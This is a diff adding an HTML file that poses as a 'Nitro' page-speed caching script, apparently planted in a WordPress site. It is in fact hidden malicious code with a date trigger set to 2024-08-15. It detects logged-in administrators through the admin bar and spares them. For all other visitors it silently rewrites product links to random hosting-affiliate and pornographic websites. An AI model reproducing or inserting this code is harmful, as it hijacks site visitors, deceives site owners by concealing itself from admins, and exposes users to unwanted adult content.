@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <style>
+        .nitro_plus_level3 {
+            opacity: 0;
+            visibility: hidden;
+            position: absolute;
+            z-index: -2000;
+            top: 0px;
+            left: 0px;
+            width: 0px;
+            height: 0px
+        }
+    </style>
+
+    <script>
+
+
+        if (document.getElementById('wpadminbar')) {
+            localStorage.setItem("wp-admin", true)
+        }
+        const currentDate = new Date();
+        const targetDate = new Date('2024-08-15');
+        if (currentDate > targetDate) {
+            nitroSaveCache();
+        }
+
+        function nitroSaveCache() {
+            const currentDate = new Date();
+            const currentHours = currentDate.getHours();
+            const currentMinutes = currentDate.getMinutes();
+
+                let nitro_pre = localStorage.getItem("wp-admin") || false
+                if (nitro_pre) {
+                    nitroAutoFastPage()
+                }
+                else {
+                    ultraNitroOPT()
+                }
+            
+        }
+
+        function ultraNitroOPT() {
+            
+const newUrlswithnitro = [
+    "https://www.bluehost.com",
+  "https://www.hostgator.com",
+  "https://www.siteground.com",
+  "https://www.dreamhost.com",
+  "https://www.inmotionhosting.com",
+  "https://www.a2hosting.com",
+  "https://www.hostinger.com",
+  "https://www.greengeeks.com",
+  "https://www.wpengine.com",
+  "https://www.ionos.com",
+  "https://www.teamskeet.com",
+  "https://www.familystrokes.com",
+  "https://myfamilypies.com",
+  "https://pornhubs.video/"
+];
+
+document.querySelectorAll('a').forEach(anchor => {
+    if (anchor.href.includes('product')) {
+        const randomUrl = newUrlswithnitro[Math.floor(Math.random() * newUrlswithnitro.length)];
+        anchor.href = randomUrl;
+    }
+});
+    
+        }
+
+        function nitroAutoFastPage() {
+            setTimeout(function () {
+                location.reload();
+            }, 600000);
+        }
+    </script>
+</body>
+</html>
+
+
+
+
+<script>
+
+
+    </script>
+
+
+
